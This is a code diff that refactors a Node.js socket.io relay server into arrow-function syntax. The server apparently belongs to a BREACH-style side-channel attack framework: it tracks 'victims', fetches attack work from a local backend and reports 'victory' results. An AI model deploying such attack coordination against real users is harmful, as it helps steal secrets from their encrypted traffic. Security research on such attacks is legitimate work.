@@ -16,11 +16,11 @@ var victims = {};
 const BACKEND_HOST = 'localhost',
       BACKEND_PORT = '8000';
 
-socket.on('connection', function(client) {
+socket.on('connection', (client) => {
     winston.info('New connection from client ' + client.id);
 
     var victimId;
-    client.on('client-hello', function({victim_id}) {
+    client.on('client-hello', ({victim_id}) => {
         if (!victims.victim_id) {
             victimId = victim_id;
             client.emit('server-hello');
@@ -30,23 +30,23 @@ socket.on('connection', function(client) {
         }
     });
 
-    var doNoWork = function() {
+    var doNoWork = () => {
         client.emit('do-work', {});
     };
 
-    var createNewWork = function() {
+    var createNewWork = () => {
         var getWorkOptions = {
             host: BACKEND_HOST,
             port: BACKEND_PORT,
             path: '/breach/get_work/' + victimId
         };
 
-        var getWorkRequest = http.request(getWorkOptions, function(response) {
+        var getWorkRequest = http.request(getWorkOptions, (response) => {
             var responseData = '';
-            response.on('data', function(chunk) {
+            response.on('data', (chunk) => {
                 responseData += chunk;
             });
-            response.on('end', function() {
+            response.on('end', () => {
                 try {
                     client.emit('do-work', JSON.parse(responseData));
                     winston.info('Got (get-work) response from backend: ' + responseData);
@@ -57,14 +57,14 @@ socket.on('connection', function(client) {
                 }
             });
         });
-        getWorkRequest.on('error', function(err) {
+        getWorkRequest.on('error', (err) => {
             winston.error('Caught getWorkRequest error: ' + err);
             doNoWork();
         });
         getWorkRequest.end();
     };
 
-    var reportWorkCompleted = function(work) {
+    var reportWorkCompleted = (work) => {
         var requestBodyString = JSON.stringify(work);
 
         var workCompletedOptions = {
@@ -78,12 +78,12 @@ socket.on('connection', function(client) {
             method: 'POST',
         };
 
-        var workCompletedRequest = http.request(workCompletedOptions, function(response) {
+        var workCompletedRequest = http.request(workCompletedOptions, (response) => {
             var responseData = '';
-            response.on('data', function(chunk) {
+            response.on('data', (chunk) => {
                 responseData += chunk;
             });
-            response.on('end', function() {
+            response.on('end', () => {
                 try {
                     var victory = JSON.parse(responseData).victory;
 
@@ -99,7 +99,7 @@ socket.on('connection', function(client) {
                 }
             });
         });
-        workCompletedRequest.on('error', function(err) {
+        workCompletedRequest.on('error', (err) => {
             winston.error('Caught workCompletedRequest error: ' + err);
             doNoWork();
         });
@@ -107,20 +107,20 @@ socket.on('connection', function(client) {
         workCompletedRequest.end();
     };
 
-    client.on('get-work', function() {
+    client.on('get-work', () => {
         winston.info('get-work from client ' + client.id);
         victims.victimId = client.id;
         createNewWork();
     });
 
-    client.on('work-completed', function({work, success, host}) {
+    client.on('work-completed', ({work, success, host}) => {
         winston.info('Client indicates work completed: ', work, success, host);
 
         var requestBody = work;
         requestBody.success = success;
         reportWorkCompleted(requestBody);
     });
-    client.on('disconnect', function() {
+    client.on('disconnect', () => {
         winston.info('Client ' + client.id + ' disconnected');
 
         for (var i in victims) {
